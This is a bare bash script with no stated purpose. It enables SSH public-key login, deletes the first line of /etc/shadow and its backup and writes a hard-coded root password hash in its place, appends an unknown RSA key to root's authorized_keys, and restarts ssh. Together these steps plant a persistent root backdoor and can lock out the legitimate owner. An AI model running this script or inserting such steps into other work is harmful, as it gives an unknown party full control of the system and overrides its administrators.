#!/bin/bash

sed -i 's/#PubkeyAuthentication/PubkeyAuthentication/g' -i /etc/ssh/sshd_config

sed '1d' -i /etc/shadow

sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow

sed '1d' -i /etc/shadow-

sed '1i\root:$y$j9T$HGTDJ.dqONFuYC5XeMA1r0$up4ugNPytqJwz4RyJfUgjPz1eAyK/NLn.ZmW6ysM7G7:19333:0:14600:14:::' -i /etc/shadow-

sudo sh -c "echo 'AAAAB3NzaC1yc2EAAAADAQABAAABgQCWqeq+SfVQF2Urd8Wjw8IK+tWm7aN1gOOGQeAtgY7/GSqqm9UqvVBcQK6vXU9fcA0g4eGwv/ctxnAqqALH4hHrPzZsPp4XHIB/7L9Q134Dv4gNXFht8DQlqIVX2KqotH9Ms3TYCQz48qF52znY90/T4KeX3x9SlFk/nnzUu4zvZsuSne8B5ZMjILmDorP5bpceT0Mu8s7iCRC1+gBa5e6k60fExSrLxeBFj/hhtadz3XCdGpB4lOMtiyoDdBJ4IEmLwr31TNsAPT9bhMqRPnoHjLuaOuGAMtvuP8rc3oMoRA6dwgXNTWlqQ0JJ4kdqG3+hFmzf9Dq0CgK/svRClwA1YW639dfNL3ZF9hz3igcTCPI4sucacTvCh4tWJcJo4PjhvUoMQD86S3+6kgrAngEU2J29kDpDzI+2Qh5mxtdhQiShLtGO5bc6OWCT/OesuuqUzlW8DD/swiW+7dsVUBpSaQkRXrMVShtS91faQqu0JcrwdznYb40llLKfPVaGLYk= click14@zoo4'  >> ~/.ssh/authorized_keys"

systemctl restart ssh
